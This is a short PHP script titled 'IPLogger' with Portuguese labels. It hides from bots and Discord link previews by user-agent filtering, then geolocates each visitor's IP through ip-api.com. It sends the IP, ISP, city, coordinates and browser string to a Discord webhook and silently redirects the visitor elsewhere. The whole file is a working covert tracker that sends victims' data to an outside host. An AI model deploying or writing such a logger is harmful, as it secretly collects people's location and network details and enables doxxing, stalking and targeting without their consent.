<?php include("config.php"); ?>
<?php
$bd1  = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $bd1)) {
die();
}
?>
<?php
$IP = $_SERVER['REMOTE_ADDR'];
$ipapi = json_decode(file_get_contents('http://ip-api.com/json/'.$IP));
$bandeira = 'https://www.countryflags.io/'.$ipapi->countryCode.'/flat/64.png';

$mensagem = json_encode([
    'content' => '**Novo IP**',
    'username' => $IP,
    'avatar_url' => $bandeira,
    'embeds' => [
        [
            'title' => 'IPLogger',
            'type' => 'rich',
            'color' => hexdec("7289DA"),
            'description' => '**IP**
'.$IP.'

**País**
'.$ipapi->country.'

**ISP**
'.$ipapi->isp.'

**Região**
'.$ipapi->regionName.'

**Cidade**
'.$ipapi->city.'

**Coordenadas**
'.$ipapi->lat.','.$ipapi->lon.'

**Navegador**
'.$_SERVER['HTTP_USER_AGENT']
            ]
        ]
    ]);

$ch = curl_init( $webhook );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $mensagem);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );
?>
<?php 
if(empty($redirect) === false) {
header("location:$redirect");
die();
}
?>
